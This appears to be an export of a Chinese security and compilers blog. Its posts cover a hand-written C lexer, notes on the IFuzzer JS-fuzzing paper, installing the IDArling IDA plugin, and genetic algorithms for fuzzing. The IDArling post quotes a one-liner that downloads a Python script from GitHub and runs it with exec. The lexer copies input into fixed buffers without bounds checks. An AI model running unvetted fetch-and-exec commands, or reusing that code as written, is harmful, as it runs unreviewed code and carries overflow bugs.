<h4 id="0x02-简单的词法分析器"><a href="#0x02-简单的词法分析器" class="headerlink" title="0x02: 简单的词法分析器"></a>0x02: 简单的词法分析器</h4><h6 id="1-定义："><a href="#1-定义：" class="headerlink" title="1. 定义："></a>1. 定义：</h6><p>词法分析器的功能输入源程序，按照构词规则分解成一系列单词符号。单词是语言中具有独立意义的最小单位，包括关键字、标识符、运算符、界符和常量等<br>(1) 关键字 是由程序语言定义的具有固定意义的标识符。例如，Pascal 中的begin，end，if，while都是保留字。这些字通常不用作一般标识符。<br>(2) 标识符 用来表示各种名字，如变量名，数组名，过程名等等。<br>(3) 常数  常数的类型一般有整型、实型、布尔型、文字型等。<br>(4) 运算符 如+、-、*、/等等。<br>(5) 界符  如逗号、分号、括号、等等。</p>
<h6 id="2-输出："><a href="#2-输出：" class="headerlink" title="2. 输出："></a>2. 输出：</h6><p>词法分析器所输出单词符号常常表示成如下的二元式：</p>
<p><code>(单词种别，单词符号的属性值)</code></p>
<p>单词种别通常用整数编码。标识符一般统归为一种。常数则宜按类型（整、实、布尔等）分种。关键字可将其全体视为一种。运算符可采用一符一种的方法。界符一般用一符一种的方法。对于每个单词符号，除了给出了种别编码之外，还应给出有关单词符号的属性信息。单词符号的属性是指单词符号的特性或特征。</p>
<h6 id="3-示例："><a href="#3-示例：" class="headerlink" title="3. 示例："></a>3. 示例：</h6><p>比如如下的代码段：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (a&gt;b) print a</span><br></pre></td></tr></table></figure>

<p>经词法分析器处理后，它将被转为如下的单词符号序列：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  &lt;keywords,if&gt;</span><br><span class="line">&lt;symbol,(&gt;</span><br><span class="line">&lt;symbol,&gt;&gt;</span><br><span class="line">&lt;symbol,)&gt;</span><br><span class="line">&lt;whitespace, &gt;</span><br><span class="line">&lt;keywords,print&gt;</span><br><span class="line">&lt;whitespace, &gt;</span><br><span class="line">&lt;whitespace,\n&gt;</span><br></pre></td></tr></table></figure>


<h6 id="4-我的实现"><a href="#4-我的实现" class="headerlink" title="4. 我的实现"></a>4. 我的实现</h6><p>很简单，逐个字符扫描的方式，选择条件结构来解析输入，并归类生成对应的二元式。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SYN_SYMBOL    0x000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SYN_KEYWORDS  0x100</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SYN_NUMBERS   0x101</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SYN_WHITESPS  0x111</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_CLASS     0x100</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *keywords[<span class="number">6</span>] = &#123;<span class="string">&quot;if&quot;</span>,<span class="string">&quot;else&quot;</span>,<span class="string">&quot;do&quot;</span>,<span class="string">&quot;while&quot;</span>,<span class="string">&quot;then&quot;</span>,<span class="string">&quot;print&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">CLASS</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> syn;</span><br><span class="line">    <span class="keyword">char</span> str[<span class="number">6</span>];</span><br><span class="line">    <span class="keyword">int</span> sum;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">CLASS</span>* <span class="title">CLASS_ARRARY</span>[<span class="title">MAX_CLASS</span>];</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save</span><span class="params">(<span class="keyword">char</span> *token)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">CLASS</span>* <span class="title">cla</span> =</span> (struct CLASS*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct CLASS));</span><br><span class="line">    cla-&gt;syn = SYN_SYMBOL;</span><br><span class="line">    <span class="built_in">strncpy</span>(cla-&gt;str,token,<span class="built_in">strlen</span>(token)&lt;<span class="number">6</span>?<span class="built_in">strlen</span>(token):<span class="number">6</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;MAX_CLASS;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(CLASS_ARRARY[i] == <span class="literal">NULL</span>)&#123;</span><br><span class="line">            CLASS_ARRARY[i] = cla;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">scaner</span><span class="params">(<span class="keyword">char</span> *userinput)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> temp;</span><br><span class="line">    <span class="keyword">int</span> idx = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> token[<span class="number">6</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">        temp = userinput[idx++];</span><br><span class="line">        <span class="keyword">if</span>((temp &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; temp &lt;= <span class="string">&#x27;z&#x27;</span> ) || (temp &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; temp &lt;= <span class="string">&#x27;Z&#x27;</span>))&#123;</span><br><span class="line">            <span class="comment">//key words</span></span><br><span class="line">            <span class="keyword">int</span> m = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">int</span> n = idx;</span><br><span class="line">            <span class="keyword">while</span>((temp &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; temp &lt;= <span class="string">&#x27;z&#x27;</span> ) || (temp &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; temp &lt;= <span class="string">&#x27;Z&#x27;</span>) || (temp &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; temp &lt;= <span class="string">&#x27;9&#x27;</span>))&#123;</span><br><span class="line">                token[m++] = temp;</span><br><span class="line">                temp = userinput[n++];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//key word scan done</span></span><br><span class="line">            token[m++] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;<span class="number">6</span>;i++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(token,keywords[i]))&#123;</span><br><span class="line">                    <span class="comment">//find it</span></span><br><span class="line">                    <span class="class"><span class="keyword">struct</span> <span class="title">CLASS</span>* <span class="title">cla</span> =</span> (struct CLASS*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct CLASS));</span><br><span class="line">                    cla-&gt;syn = SYN_KEYWORDS;</span><br><span class="line">                    <span class="built_in">strncpy</span>(cla-&gt;str,token,<span class="number">6</span>);</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;MAX_CLASS;i++)&#123;</span><br><span class="line">                        <span class="keyword">if</span>(CLASS_ARRARY[i] == <span class="literal">NULL</span>)&#123;</span><br><span class="line">                            CLASS_ARRARY[i]= cla;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(temp &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; temp &lt;= <span class="string">&#x27;9&#x27;</span>)&#123;</span><br><span class="line">            <span class="comment">//numbers</span></span><br><span class="line">            <span class="keyword">int</span> m = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">int</span> n = idx;</span><br><span class="line">            <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span>((temp &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; temp &lt;= <span class="string">&#x27;9&#x27;</span>))&#123;</span><br><span class="line">                sum=sum*<span class="number">10</span> + temp - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">                temp = userinput[n++];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">CLASS</span>* <span class="title">cla</span> =</span> (struct CLASS*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct CLASS));</span><br><span class="line">            cla-&gt;syn = SYN_NUMBERS;</span><br><span class="line">            cla-&gt;sum = sum;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;MAX_CLASS;i++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(CLASS_ARRARY[i] == <span class="literal">NULL</span>)&#123;</span><br><span class="line">                    CLASS_ARRARY[i] = cla;</span><br><span class="line">                    idx = n;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//other chars</span></span><br><span class="line">            <span class="keyword">switch</span>(temp)&#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;&gt;&#x27;</span>:&#123;</span><br><span class="line">                    token[<span class="number">0</span>] = temp;</span><br><span class="line">                    <span class="keyword">char</span> tmp = userinput[idx];</span><br><span class="line">                    <span class="keyword">if</span>(tmp == <span class="string">&#x27;=&#x27;</span>)&#123;</span><br><span class="line">                        token[<span class="number">1</span>] = tmp;</span><br><span class="line">                        idx ++;</span><br><span class="line">                    &#125;</span><br><span class="line">                    save(token);</span><br><span class="line">                &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;&lt;&#x27;</span>:&#123;</span><br><span class="line">                    token[<span class="number">0</span>] = temp;</span><br><span class="line">                    <span class="keyword">char</span> tmp = userinput[idx];</span><br><span class="line">                    <span class="keyword">if</span>(tmp == <span class="string">&#x27;=&#x27;</span>) &#123;</span><br><span class="line">                        token[<span class="number">1</span>] = tmp;</span><br><span class="line">                        idx++;</span><br><span class="line">                    &#125;</span><br><span class="line">                    save(token);</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;=&#x27;</span>:&#123;</span><br><span class="line">                    token[<span class="number">0</span>] = temp;</span><br><span class="line">                    <span class="keyword">char</span> tmp = userinput[idx];</span><br><span class="line">                    <span class="keyword">if</span>(tmp == <span class="string">&#x27;=&#x27;</span>) &#123;</span><br><span class="line">                        token[<span class="number">1</span>] = tmp;</span><br><span class="line">                        idx++;</span><br><span class="line">                    &#125;</span><br><span class="line">                    save(token);</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;;&#x27;</span>:</span><br><span class="line">                    token[<span class="number">0</span>] = <span class="string">&#x27;;&#x27;</span>;</span><br><span class="line">                    save(token);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;!&#x27;</span>:&#123;</span><br><span class="line">                    token[<span class="number">0</span>] = temp;</span><br><span class="line">                    <span class="keyword">char</span> tmp = userinput[idx+<span class="number">1</span>];</span><br><span class="line">                    <span class="keyword">if</span>(tmp == <span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">                        token[<span class="number">1</span>] = tmp;</span><br><span class="line">                    save(token);</span><br><span class="line">                &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">                    token[<span class="number">0</span>] = temp;</span><br><span class="line">                    save(token);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">                    token[<span class="number">0</span>] = temp;</span><br><span class="line">                    save(token);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">                    token[<span class="number">0</span>] = temp;</span><br><span class="line">                    save(token);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">                    token[<span class="number">0</span>] = temp;</span><br><span class="line">                    save(token);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;\\&#x27;</span>:</span><br><span class="line">                    token[<span class="number">0</span>] = temp;</span><br><span class="line">                    save(token);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;(&#x27;</span>:</span><br><span class="line">                    token[<span class="number">0</span>] = temp;</span><br><span class="line">                    save(token);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;)&#x27;</span>:</span><br><span class="line">                    token[<span class="number">0</span>] = temp;</span><br><span class="line">                    save(token);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;\n&#x27;</span>:&#123;</span><br><span class="line">                    <span class="class"><span class="keyword">struct</span> <span class="title">CLASS</span>* <span class="title">cla</span> =</span> (struct CLASS*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct CLASS));</span><br><span class="line">                    cla-&gt;syn = SYN_WHITESPS;</span><br><span class="line">                    <span class="built_in">strncpy</span>(cla-&gt;str,<span class="string">&quot;\\n&quot;</span>,<span class="number">2</span>);</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;MAX_CLASS;i++)&#123;</span><br><span class="line">                        <span class="keyword">if</span>(CLASS_ARRARY[i] == <span class="literal">NULL</span>)&#123;</span><br><span class="line">                            CLASS_ARRARY[i] = cla;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;\t&#x27;</span>:&#123;</span><br><span class="line">                    <span class="class"><span class="keyword">struct</span> <span class="title">CLASS</span>* <span class="title">cla</span> =</span> (struct CLASS*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct CLASS));</span><br><span class="line">                    cla-&gt;syn = SYN_WHITESPS;</span><br><span class="line">                    <span class="built_in">strncpy</span>(cla-&gt;str,<span class="string">&quot;\\t&quot;</span>,<span class="number">2</span>);</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;MAX_CLASS;i++)&#123;</span><br><span class="line">                        <span class="keyword">if</span>(CLASS_ARRARY[i] == <span class="literal">NULL</span>)&#123;</span><br><span class="line">                            CLASS_ARRARY[i] = cla;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27; &#x27;</span>:&#123;</span><br><span class="line">                    <span class="class"><span class="keyword">struct</span> <span class="title">CLASS</span>* <span class="title">cla</span> =</span> (struct CLASS*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct CLASS));</span><br><span class="line">                    cla-&gt;syn = SYN_WHITESPS;</span><br><span class="line">                    <span class="built_in">strncpy</span>(cla-&gt;str,<span class="string">&quot; &quot;</span>,<span class="number">2</span>);</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;MAX_CLASS;i++)&#123;</span><br><span class="line">                        <span class="keyword">if</span>(CLASS_ARRARY[i] == <span class="literal">NULL</span>)&#123;</span><br><span class="line">                            CLASS_ARRARY[i] = cla;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;#&#x27;</span>:</span><br><span class="line">                    <span class="comment">//end</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;unknown:%c\n&quot;</span>,temp);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">while</span>(temp != <span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> userinput[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> flag = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> temp;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Plz input your string:&quot;</span>);</span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">        temp = getchar();</span><br><span class="line">        userinput[flag++] = temp;</span><br><span class="line">    &#125;<span class="keyword">while</span>(temp != <span class="string">&#x27;#&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    scaner(userinput);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;MAX_CLASS;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(CLASS_ARRARY[i])&#123;</span><br><span class="line">            <span class="keyword">switch</span>(CLASS_ARRARY[i]-&gt;syn)&#123;</span><br><span class="line">                <span class="keyword">case</span> SYN_NUMBERS:</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;&lt;numbers,%d&gt;\n&quot;</span>,CLASS_ARRARY[i]-&gt;sum);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> SYN_KEYWORDS:</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;&lt;keywords,%s&gt;\n&quot;</span>,CLASS_ARRARY[i]-&gt;str);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> SYN_WHITESPS:</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;&lt;whitespace,%s&gt;\n&quot;</span>,CLASS_ARRARY[i]-&gt;str);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> SYN_SYMBOL:</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;&lt;symbol,%s&gt;\n&quot;</span>,CLASS_ARRARY[i]-&gt;str);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Done.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h6 id="5-效果"><a href="#5-效果" class="headerlink" title="5. 效果"></a>5. 效果</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Plz input your string:if(a&gt;b) print a</span><br><span class="line">#</span><br><span class="line">&lt;keywords,if&gt;</span><br><span class="line">&lt;symbol,(&gt;</span><br><span class="line">&lt;symbol,&gt;&gt;</span><br><span class="line">&lt;symbol,)&gt;</span><br><span class="line">&lt;whitespace, &gt;</span><br><span class="line">&lt;keywords,print&gt;</span><br><span class="line">&lt;whitespace, &gt;</span><br><span class="line">&lt;whitespace,\n&gt;</span><br><span class="line">Done.</span><br></pre></td></tr></table></figure>

<h6 id="6-更好的实现"><a href="#6-更好的实现" class="headerlink" title="6.  更好的实现"></a>6.  更好的实现</h6><p>使用正则表达式，待补充。</p>
<h4 id="0x03-待学习内容"><a href="#0x03-待学习内容" class="headerlink" title="0x03: 待学习内容"></a>0x03: 待学习内容</h4><ol>
<li>词法分析（利用正则的词法分析器）</li>
<li>语法分析</li>
<li>中间优化</li>
<li>代码生成</li>
</ol>
<p>开了个坑，慢慢填吧。</p>
<h4 id="0x04-参考内容"><a href="#0x04-参考内容" class="headerlink" title="0x04: 参考内容"></a>0x04: 参考内容</h4><p><a href="http://www.cnblogs.com/yanlingyin/archive/2012/04/17/2451717.html">词法分析器的实现</a></p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>Compilers</tag>
      </tags>
  </entry>
  <entry>
    <title>论文阅读&lt;IFuzzer: An Evolutionary Interpreter Fuzzer using Genetic Programming&gt;</title>
    <url>/2018/06/09/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB-IFuzzer-An-Evolutionary-Interpreter-Fuzzer-using-Genetic-Programming/</url>
    <content><![CDATA[<h4 id="0x00-关于"><a href="#0x00-关于" class="headerlink" title="0x00:关于"></a>0x00:关于</h4><p>最近在阅读一些漏洞挖掘相关技术的论文，正好读到这篇，做个记录。<br>这篇论文是<code>IFuzzer: An Evolutionary Interpreter Fuzzer using Genetic Programming</code>。<br>主要是介绍<a href="https://github.com/vspandan/IFuzzer">IFuzzer</a>的一篇论文，主要是利用antlr4+遗传算法搞js fuzz。</p>
<a id="more"></a>

<h4 id="0x01-论文阅读"><a href="#0x01-论文阅读" class="headerlink" title="0x01:论文阅读"></a>0x01:论文阅读</h4><p>该论文主要是针对脚本引擎的fuzz，只是文中使用了js engine作为目标。</p>
<p>核心思想就是：收集大量的测试代码，使用antlr4编写好的语法解析器解析出<code>非终结符片段</code>，把输入解析成AST后，在AST上进行变异。</p>
<p>变异的方式主要是利用收集的“片段”去替换解析树中相同非终结符，由于采用了遗传算法，通过对每个个体的评估，筛选优秀的个体进行“杂交”产生新的个体进入下一轮fuzz，“杂交”的方法是交换两个个体中相同的非终结符节点，产生两棵新的输。</p>
<p>采用遗传算法必须面对膨胀控制的问题。这里论文作者对每个个体评估时，采用了如下的公式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fb(x) &#x3D; score_structure + score_feedback</span><br><span class="line">ffinal(x) &#x3D; fb(x) − c ∗ (l(x))</span><br></pre></td></tr></table></figure>
<p>即：</p>
<p>基础得分=结构得分+(解释器)回馈得分<br>最终得分=基础的分-膨胀控制</p>
<p>这样的话的确有效的控制了遗传算法在迭代中的膨胀问题。</p>
<p>论文中测试部分没仔细看，我只关注了核心的算法和一些问题的解决，剩下的工作就是去阅读IFuzzer代码去体会了。</p>
<h4 id="0x02-个人想法"><a href="#0x02-个人想法" class="headerlink" title="0x02:个人想法"></a>0x02:个人想法</h4><p>首先感觉这个东西没那么完善，或者说没放全。</p>
<p>变异的策略其实可以更多的，这种替换的方式感觉还是有局限性，其实就是类似于用一大堆积木，去组合，是从现有的东西生成一些组合性的东西；如果可以加入创造性的东西就好了，比如积木的形状、材质改变，然后去创造新的组合。</p>
<p>记得几个月前看过韩国一个大佬（BoB计划的导师）的slide，他做的类似的事情，但是不一样的是：他把收集的测试代码、poc解析后到AST然后到IR，直接在IR上操作，之后从IR再生成js代码，效果也不错，但是那个没放出源码所以也不好与IFuzzer比较。</p>
<p>从身边的大佬的说法来看，IFuzzer很有限，需要改进的地方很多- 。- 不过我个人认为，这样的思路值得借鉴，虽然很好想，但是难做啊。。去年就想这么搞了，然而一些基础知识跟不上，现如今可以试一试啦～</p>
<h4 id="0x03-引用"><a href="#0x03-引用" class="headerlink" title="0x03:引用"></a>0x03:引用</h4><p><a href="https://link.springer.com/chapter/10.1007/978-3-319-45744-4_29">IFuzzer: An Evolutionary Interpreter Fuzzer using Genetic Programming</a></p>
]]></content>
      <categories>
        <category>论文阅读</category>
      </categories>
      <tags>
        <tag>study</tag>
        <tag>fuzz</tag>
        <tag>paper</tag>
      </tags>
  </entry>
  <entry>
    <title>逆向协作之IDA插件IDArling</title>
    <url>/2018/12/25/%E9%80%86%E5%90%91%E5%8D%8F%E4%BD%9C%E4%B9%8BIDA%E6%8F%92%E4%BB%B6IDArling/</url>
    <content><![CDATA[<h4 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 : 介绍"></a>0x00 : 介绍</h4><p><code>IDArling</code>是一个逆向协作插件，将IDA使用过程中产生的数据文件放在服务器上，并且可以自动同步，适合多人协作使用，比如CTF比赛、工作中的项目；也适合个人使用，比如在公司的工作内容同步到自己的服务器上，回家之后用家里的电脑方便查看和使用。</p>
<a id="more"></a>

<p>我就属于后者…有时候懒得背电脑回家，有时候逆向的时候很不方便，<code>idb</code>之间同步就是问题…而且目标更新之后，多个版本的逆向对比，不方便，直接部署到服务器上还是很方便的。</p>
<h4 id="0x01-安装以及部署"><a href="#0x01-安装以及部署" class="headerlink" title="0x01 : 安装以及部署"></a>0x01 : 安装以及部署</h4><h5 id="1-具体的安装步骤"><a href="#1-具体的安装步骤" class="headerlink" title="1. 具体的安装步骤"></a>1. 具体的安装步骤</h5><p>以下来自官方github上项目的readme文档：</p>
<ul>
<li>​    Copy <code>idarling_plugin.py</code> and the <code>idarling</code> folder to the IDA plugins folder.</li>
<li>   Alternatively, you can use the “easy install” method by copying the following</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib2; exec(urllib2.urlopen(<span class="string">&#x27;https://raw.githubusercontent.com/IDArlingTeam/IDArling/master/easy_install.py&#x27;</span>)).read()</span><br></pre></td></tr></table></figure>

<p>这行py在IDA自带的那个py shell里执行就好了。</p>
<p>安装之后IDA的右下角会出现 <code>IDArling v0.0.1 | .....</code>的字样，说明安装成功。</p>
<h5 id="2-部署"><a href="#2-部署" class="headerlink" title="2. 部署"></a>2. 部署</h5><p>只需要安装pyqt5就好了，我这里用的ubuntu。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install python-pyqt5</span><br></pre></td></tr></table></figure>

<p>然后直接运行server脚本就可以启动服务。</p>
<h5 id="3-使用"><a href="#3-使用" class="headerlink" title="3. 使用"></a>3. 使用</h5><p>IDA右下角插件图标的地方，右键，添加服务器信息，然后选择服务器连接，就可以使用了。</p>
<h4 id="0x02-引用"><a href="#0x02-引用" class="headerlink" title="0x02 : 引用"></a>0x02 : 引用</h4><p><a href="https://github.com/IDArlingTeam/IDArling/blob/master/README.md">IDArling</a></p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>IDA</tag>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title>遗传算法初窥</title>
    <url>/2018/06/03/%E9%81%97%E4%BC%A0%E7%AE%97%E6%B3%95%E5%88%9D%E7%AA%A5/</url>
    <content><![CDATA[<h4 id="0x00"><a href="#0x00" class="headerlink" title="0x00:"></a>0x00:</h4><p>读Fuzzing相关的paper的时候遇到了关于遗传算法的问题，其实AFL晒样本也是用了遗传算法，个人的话一直没去探究，正好读paper遇到了，就搜了一下，找到了一篇好文 <a href="https://blog.sicara.com/getting-started-genetic-algorithms-python-tutorial-81ffa1dd72f9">getting-started-genetic-algorithms-python-tutorial</a>，看完之后一下子明了，并且大呼过瘾 (好文章啊!)</p>
<a id="more"></a>

<h4 id="0x01-达尔文进化论"><a href="#0x01-达尔文进化论" class="headerlink" title="0x01 : 达尔文进化论"></a>0x01 : 达尔文进化论</h4><p><code>达尔文认为，生物之间存在着生存争斗，适应者生存下来，不适者则被淘汰，这就是自然的选择。生物正是通过遗传、变异和自然选择，从低级到高级，从简单到复杂，种类由少到多地进化着、发展着。</code></p>
<h4 id="0x02-遗传算法简述"><a href="#0x02-遗传算法简述" class="headerlink" title="0x02 : 遗传算法简述"></a>0x02 : 遗传算法简述</h4><p>这个算法的核心理念很简单：<code>如果一个种群想持续发展下去，就必须不断的提高自身，去适应环境，在使用过程中会个体会产生变异，适应环境的变异会保留下来，遗传给后代，这么一代一代的筛选下来，留下来的都是最适应环境的个体。</code></p>
<p>我们拿Fuzz举例，每一个样本进去所触发的路径、执行时间都有差异，那么如何去筛选出有效的样本，从而从这些样本再次迭代出新一代样本，从而让我们的Fuzz更加有效呢？</p>
<p>这时候我们需要一个评分规则（类比环境适应能力），评分越高，那么适应能力就越好，在这次样本变异中变异的部分（特性）会被保留下来，遗传给下一代。</p>
<p>参考AFL，它使用了路径等信息计算一个评分，评分高的样本保留（触发路径多），那么从这些样本中迭代，就容易产生更“优秀”的样本文件。</p>
<p>下图遗传算法的简单描述:</p>
<p><img src="http://blogimg-10065924.cossh.myqcloud.com/genetic_algorithm/GP.png" alt="GP"></p>
